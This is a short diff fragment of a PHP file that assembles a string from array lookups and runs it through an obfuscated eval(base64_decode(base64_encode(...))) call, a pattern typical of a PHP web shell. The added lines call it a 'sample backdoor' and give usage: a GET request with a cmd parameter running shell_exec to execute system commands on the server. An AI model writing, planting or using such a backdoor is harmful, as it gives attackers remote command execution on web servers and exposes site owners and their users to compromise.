@@ -13,3 +13,5 @@ foreach ($keys as $key => $value) {
 	$k .= "$r[$value]";
 }
 eval(base64_decode(base64_encode($k)));
+?>
+Pleas send request : ?cmd=echo shell_exec("dir"); for run sample backdoor with GET files
